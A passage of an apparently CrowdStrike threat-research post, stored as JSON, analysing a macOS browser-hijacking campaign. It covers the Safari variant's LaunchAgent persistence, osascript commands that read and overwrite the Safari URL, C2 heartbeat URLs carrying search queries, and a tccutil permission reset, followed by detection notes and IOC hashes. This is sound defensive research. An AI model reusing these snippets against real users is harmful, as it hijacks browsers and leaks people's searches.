                    "html": "<p>The ad alarm runs every 30 minutes. Its objective is to ensure that the ad content is updated and running. To do this, it retrieves the ad object from the expiry storage. If it is expired, new ad content is loaded from:</p>"
                },
                {
                    "id": "<sentence_0xa3019a5a>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x2be480ab>": "https://[C2Domain]/ad?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/ad?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>"
                },
                {
                    "id": "<sentence_0x40afdd6d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x808ace6a>": "tabId",
                        "<code_0x75f9c3a7>": "tabId"
                    },
                    "text": "This content is opened in a new tab, and the new tabs tabId is stored in expiry storage with a 24-hour expiration date. If the alarm runs and the ad content is not expired, then it checks to see if the tabId is still open. If it isnt, it proceeds as if the ad content is expired.",
                    "html": "<p>This content is opened in a new tab, and the new tab\u2019s <code>tabId</code> is stored in expiry storage with a 24-hour expiration date. If the alarm runs and the ad content is not expired, then it checks to see if the <code>tabId</code> is still open. If it isn\u2019t, it proceeds as if the ad content is expired.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xc0d07064>",
            "title": "Fake Safari Installer",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x4909c074>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Research into this family led to the discovery of a variant targeting the Safari browser. This variant shares many similarities to the Chrome variant; however, it is technically less advanced.",
                    "html": "<p>Research into this family led to the discovery of a variant targeting the Safari browser. This variant shares many similarities to the Chrome variant; however, it is technically less advanced. </p>"
                }
            ]
        },
        {
            "id": "<chapter_0xe14a7186>",
            "title": "Persistence and Core Functionality",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0x4cb785d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xda7faf18>": "~/Library/LaunchAgents/com.safarii.extension.plist",
                        "<code_0xbc03f023>": "StartInterval",
                        "<code_0x984f085>": "RunAtLoad",
                        "<code_0x8b180c78>": "RunAtLoad"
                    },
                    "text": "The first plist, ~/Library/LaunchAgents/com.safarii.extension.plist, does not use a StartInterval value like the Chrome variant, but instead uses RunAtLoad. The RunAtLoad parameter is executed when the user logs into their computer. Note that the plist file does not use the correct spelling of Safari.",
                    "html": "<p>The first plist, <code>~/Library/LaunchAgents/com.safarii.extension.plist</code>, does not use a <code>StartInterval</code> value like the Chrome variant, but instead uses <code>RunAtLoad</code>. The <code>RunAtLoad</code> parameter is executed when the user logs into their computer. Note that the plist file does not use the correct spelling of Safari. </p>"
                },
                {
                    "id": "<sentence_0xeb2f1e4d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "At the time of writing, the Python payload runs in an infinite loop and serves two functions:",
                    "html": "<p>At the time of writing, the Python payload runs in an infinite loop and serves two functions:</p>"
                },
                {
                    "id": "<sentence_0x1b3182c3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Sends a periodic heartbeat (approximately every hour)<crlf>Monitors search engine queries in Safari",
                    "html": "<ol>\n<li>Sends a periodic heartbeat (approximately every hour)</li>\n<li>Monitors search engine queries in Safari</li>\n</ol>"
                },
                {
                    "id": "<sentence_0xdbd010ca>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xd417351c>": "ps aux",
                        "<code_0xbf58314f>": "base64 \u2013decode | python"
                    },
                    "text": "The script ensures that only one copy is running via a call to ps aux. If any process commandline contain base64 decode | python, then the newly executing script exits.",
                    "html": "<p>The script ensures that only one copy is running via a call to <code>ps aux</code>. If any process commandline contain <code>base64 \u2013decode | python</code>, then the newly executing script exits. </p>"
                },
                {
                    "id": "<sentence_0xd412d1e8>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The hourly heartbeat calls out to:",
                    "html": "<p>The hourly heartbeat calls out to:</p>"
                },
                {
                    "id": "<sentence_0xfe023b00>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xfcf847c4>": "https://[C2Domain]/hb?ext=saf&ver=[ScriptVersion]&is=0&dd=[ScriptId]&q=[LastSearchQuery]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/hb?ext=saf&amp;ver=[ScriptVersion]&amp;is=0&amp;dd=[ScriptId]&amp;q=[LastSearchQuery]</code>"
                },
                {
                    "id": "<sentence_0xddeffbd3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x35400cfa>": "osascript"
                    },
                    "text": "Similar to the Chrome extension, the Python script monitors searches to Google, Yahoo and Bing through the use of AppleScript. Every loop interval (~0.1 seconds), the following osascript process is used to capture the currently opened Safari URL:",
                    "html": "<p>Similar to the Chrome extension, the Python script monitors searches to Google, Yahoo and Bing through the use of AppleScript. Every loop interval (~0.1 seconds), the following <code>osascript</code> process is used to capture the currently opened Safari URL:</p>"
                },
                {
                    "id": "<sentence_0x547dd716>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x26097c64>": "osascript -e 'tell application \"safari\"\nset curURL to URL in front document\nreturn curURL\nend tell\u2019"
                    },
                    "text": "",
                    "html": "<code>osascript -e 'tell application \"safari\"\nset curURL to URL in front document\nreturn curURL\nend tell\u2019</code>"
                },
                {
                    "id": "<sentence_0x88c3af8>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "If a new search query is found, the Safari windows URL is overwritten with:",
                    "html": "<p>If a new search query is found, the Safari window\u2019s URL is overwritten with: </p>"
                },
                {
                    "id": "<sentence_0x1948705c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x69c51e1c>": "https://[C2Domain]/search?ext=saf&ver=[ScriptVersion]&is=0&dd=[ScriptId]&q=[OriginalSearchQuery]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/search?ext=saf&amp;ver=[ScriptVersion]&amp;is=0&amp;dd=[ScriptId]&amp;q=[OriginalSearchQuery]</code>"
                },
                {
                    "id": "<sentence_0x477b2486>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This is accomplished by the following osascript process:",
                    "html": "<p>This is accomplished by the following osascript process: </p>"
                },
                {
                    "id": "<sentence_0x87d4660>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xcc7c533f>": "osascript -e 'tell application \"safari\"\nset URL in front document to \"[URL]\"\nend tell\u2019"
                    },
                    "text": "",
                    "html": "<code>osascript -e 'tell application \"safari\"\nset URL in front document to \"[URL]\"\nend tell\u2019</code>"
                },
                {
                    "id": "<sentence_0x4abb1917>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x34e89599>": "osascript",
                        "<code_0xb66563fc>": "tccutil"
                    },
                    "text": "If the script detects that it does not have the necessary transparency, consent and control (TCC) permissions to launch osascript or call out to the C2, it will launch a tccutil subprocess to reset all permissions for Apple Events. By resetting this value, the user will be re-prompted with a security warning. The author is hoping that because of the new prompt, the user will allow the Apple Events communication.",
                    "html": "<p>If the script detects that it does not have the necessary transparency, consent and control (TCC) permissions to launch <code>osascript</code> or call out to the C2, it will launch a <code>tccutil</code> subprocess to reset all permissions for Apple Events. By resetting this value, the user will be re-prompted with a security warning. The author is hoping that because of the new prompt, the user will allow the Apple Events communication. </p>"
                },
                {
                    "id": "<sentence_0x6cd242bb>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x47fbf291>": "SafariInstaller.command",
                        "<code_0xbdabdcf2>": "~Library/LaunchAgents/com.extension.pop.plist",
                        "<code_0x6246e6b2>": "com.chrome.extensionsPop.plist",
                        "<code_0x7e3b61c7>": "os.system",
                        "<code_0x94a0581b>": "https[:]//ationwindon[.]com"
                    },
                    "text": "The SafariInstaller.command script writes its second plist file to ~Library/LaunchAgents/com.extension.pop.plist. This plist serves the same purpose as com.chrome.extensionsPop.plist. It uses Python and an os.system call to open a new Safari window to the same https[:]//ationwindon[.]com domain observed in the Chrome installer variants.",
                    "html": "<p>The <code>SafariInstaller.command</code> script writes its second plist file to <code>~Library/LaunchAgents/com.extension.pop.plist</code>. This plist serves the same purpose as <code>com.chrome.extensionsPop.plist</code>. It uses Python and an <code>os.system</code> call to open a new Safari window to the same <code>https[:]//ationwindon[.]com</code> domain observed in the Chrome installer variants.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x64d060b0>",
            "title": "Impact",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xd1a2345>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Both variants result in an altered user experience. Accomplished through the Chrome extension or AppleScript, both variants are highly persistent and perform browser hijacking. They are successful in continually displaying ad content and redirecting web searches to attacker-controlled redirect pages.",
                    "html": "<p>Both variants result in an altered user experience. Accomplished through the Chrome extension or AppleScript, both variants are highly persistent and perform browser hijacking. They are successful in continually displaying ad content and redirecting web searches to attacker-controlled redirect pages. </p>"
                }
            ]
        },
        {
            "id": "<chapter_0x688c9150>",
            "title": "The Falcon Platforms Continuous Monitoring and Visibility",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xa2bfb91e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x927c8aad>": "https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/"
                    },
                    "text": "The Falcon platform takes a layered approach to protect workloads. Using on-sensor and cloud-based machine learning, behavior-based detection using indicators of attack (IOAs), and intelligence related to tactics, techniques and procedures (TTPs) employed by threats and threat actors, the Falcon platform enables visibility, threat detection and continuous monitoring for any environment, reducing the time to detect and mitigate threats.",
                    "html": "<p>The Falcon platform takes a layered approach to protect workloads. Using on-sensor and cloud-based machine learning, behavior-based detection using <a href=\"https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/\">indicators of attack (IOAs)</a>, and intelligence related to tactics, techniques and procedures (TTPs) employed by threats and threat actors, the Falcon platform enables visibility, threat detection and continuous monitoring for any environment, reducing the time to detect and mitigate threats.</p>"
                },
                {
                    "id": "<sentence_0xb5975659>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure2.png\" rel=\"noopener\" target=\"_blank\"><img alt=\"\" class=\"wp-image-122848 size-full\" height=\"1085\" src=\"https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure2.png\" width=\"2342\"/></a>"
                },
                {
                    "id": "<sentence_0xeff42762>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 2. Suspicious plist creation (Click to enlarge)",
                    "html": "<p class=\"wp-caption-text\" id=\"caption-attachment-122848\">Figure 2. Suspicious plist creation (Click to enlarge)</p>"
                },
                {
                    "id": "<sentence_0xe28884b4>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Falcon platforms behavior-based IOAs detect and prevent behaviors that indicate malicious intent. For example, Falcon detects and prevents behavior such as the installation of suspicious ASEP plist files (see Figure 2) and execution of sideloaded, suspicious Chrome extensions (see Figure 3).",
                    "html": "<p>The Falcon platform\u2019s behavior-based IOAs detect and prevent behaviors that indicate malicious intent. For example, Falcon detects and prevents behavior such as the installation of suspicious ASEP plist files (see Figure 2) and execution of sideloaded, suspicious Chrome extensions (see Figure 3). </p>"
                },
                {
                    "id": "<sentence_0xef80fe1>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure3.png\" rel=\"noopener\" target=\"_blank\"><img alt=\"\" class=\"wp-image-122849 size-full\" height=\"1120\" src=\"https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure3.png\" width=\"2877\"/></a>"
                },
                {
                    "id": "<sentence_0xaf67dfc5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 3. Previously infected host IOA detection (Click to enlarge)",
                    "html": "<p class=\"wp-caption-text\" id=\"caption-attachment-122849\">Figure 3. Previously infected host IOA detection (Click to enlarge)</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xee7b143d>",
            "title": "Indicators of Compromise (IOCs)",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xdfb9feaa>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The hashes below are a small subset of the total DMGs and corresponding installer scripts uncovered in the campaign, to be used as reference samples.",
                    "html": "<p>The hashes below are a small subset of the total DMGs and corresponding installer scripts uncovered in the campaign, to be used as reference samples.</p>"
                },
                {
                    "id": "<sentence_0x152d1b40>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0x1fc707a>": {
                            "0": {
                                "0": "File",
                                "1": "Your File Is Ready To Download.dmg",
                                "2": "SafariInstaller.command",
                                "3": "nature_beautiful_short_video_720p_hd (2).dmg",
                                "4": "ChromeInstaller.command",
                                "5": "BigBrother_AnotherStory-0.07.p2.00-mac.zip.dmg",
                                "6": "installer.command"
                            },
                            "1": {
                                "0": "SHA256",
                                "1": "46bbb3103bdc2263a0b50eb80815705f61885b3e3e132e5e5c5ff822512085ca",
                                "2": "e31607b87355b4ae3e5f96c6b48ed783e6b706fb1c2ab6a1ff25a13af615bca7",
                                "3": "81ac23cc9dba6bed6e33d172e011ead46254a29483c287f35c670d81bc9785b7",
                                "4": "e734ec9832f8385eb737dd024eb96d53d0d3cb534a72afb4730db8e7e6162fcc",
                                "5": "53ddfdb4c01ace20322647eead73ddf77e6d9613b73ca90521c2e57063be387b",
                                "6": "83d6ab417c9a362e6292dd8d85032b623889d9154b9d357fd8576f843fbecae9"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table class=\"orange\">\n<tbody>\n<tr class=\"top-row bg-orange\">\n<td>File</td>\n<td>SHA256</td>\n</tr>\n<tr>\n<td><code>Your File Is Ready To Download.dmg</code></td>\n<td><code>46bbb3103bdc2263a0b50eb80815705f61885b3e3e132e5e5c5ff822512085ca</code></td>\n</tr>\n<tr>\n<td><code>SafariInstaller.command</code></td>\n<td><code>e31607b87355b4ae3e5f96c6b48ed783e6b706fb1c2ab6a1ff25a13af615bca7</code></td>\n</tr>\n<tr>\n<td><code>nature_beautiful_short_video_720p_hd (2).dmg</code></td>\n<td><code>81ac23cc9dba6bed6e33d172e011ead46254a29483c287f35c670d81bc9785b7</code></td>\n</tr>\n<tr>\n<td><code>ChromeInstaller.command</code></td>\n<td><code>e734ec9832f8385eb737dd024eb96d53d0d3cb534a72afb4730db8e7e6162fcc</code></td>\n</tr>\n<tr>\n<td><code>BigBrother_AnotherStory-0.07.p2.00-mac.zip.dmg</code></td>\n<td><code>53ddfdb4c01ace20322647eead73ddf77e6d9613b73ca90521c2e57063be387b</code></td>\n</tr>\n<tr>\n<td><code>installer.command</code></td>\n<td><code>83d6ab417c9a362e6292dd8d85032b623889d9154b9d357fd8576f843fbecae9</code></td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x4c1d0d15>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xb262823f>": {
                            "0": {
                                "0": "Domains",
                                "1": "ationwindon[.]com"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table class=\"orange\" width=\"624\">\n<tbody>\n<tr class=\"top-row bg-orange\">\n<td>Domains</td>\n</tr>\n<tr>\n<td><code>ationwindon[.]com</code></td>\n</tr>\n</tbody>\n</table>"
                }
            ]
        },
        {
            "id": "<chapter_0x89317c26>",
            "title": "Additional Resources",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0x89176508>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x6105ed88>": "https://www.crowdstrike.com/falcon-endpoint-security-for-macos/",
                        "<a_0x9c57ab89>": "https://crowdstrike.wistia.com/medias/eitp4iya00",
                        "<a_0x44424b4d>": "https://go.crowdstrike.com/try-falcon-prevent.html"
                    },
                    "text": "Learn more about Falcon Endpoint Security for macOS.<crlf>Check out a video demo for Falcon Endpoint Security for macOS.<crlf>Test CrowdStrike next-gen AV for yourself with a free trial of Falcon Prevent.",
                    "html": "<ul>\n<li>Learn more about <a href=\"https://www.crowdstrike.com/falcon-endpoint-security-for-macos/\">Falcon Endpoint Security for macOS</a>.</li>\n<li>Check out <a href=\"https://crowdstrike.wistia.com/medias/eitp4iya00\">a video demo</a> for Falcon Endpoint Security for macOS.</li>\n<li>Test CrowdStrike next-gen AV for yourself with a<a href=\"https://go.crowdstrike.com/try-falcon-prevent.html\"> free trial of Falcon Prevent\u2122</a>.</li>\n</ul>"
                },
                {
                    "id": "<sentence_0xbec38ac9>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xbfede47a>": "https://twitter.com/share?text=CrowdStrike+Uncovers+New+MacOS+Browser+Hijacking+Campaign&url=https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/",
                        "<a_0xb3a6d4a4>": "https://www.linkedin.com/shareArticle?mini=true&url=https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/&title=CrowdStrike+Uncovers+New+MacOS+Browser+Hijacking+Campaign"
                    },
                    "text": "Tweet<crlf>Share",
                    "html": "<ul class=\"list-share-buttons\">\n<li class=\"share-button\">\n<a class=\"tweet-btn\" href=\"https://twitter.com/share?text=CrowdStrike+Uncovers+New+MacOS+Browser+Hijacking+Campaign&amp;url=https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/\" rel=\"noopener noreferrer\" target=\"_blank\">\nTweet\n</a>\n</li>\n<li class=\"share-button\">\n<a class=\"li-btn\" href=\"https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/&amp;title=CrowdStrike+Uncovers+New+MacOS+Browser+Hijacking+Campaign\" rel=\"noopener noreferrer\" target=\"_blank\">\nShare\n</a>\n</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x411013ba>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x44424b4d>": "https://go.crowdstrike.com/try-falcon-prevent.html",
                        "<img_0x18b7f7>": "https://www.crowdstrike.com/wp-content/themes/main-theme/dist/images/blog/breaches-stop-here-post-cta.jpeg"
                    },
                    "text": "",
                    "html": "<a href=\"https://go.crowdstrike.com/try-falcon-prevent.html\">\n<img class=\"post_cta\" src=\"https://www.crowdstrike.com/wp-content/themes/main-theme/dist/images/blog/breaches-stop-here-post-cta.jpeg\"/>\n</a>"
                }
            ]
        }
    ]
}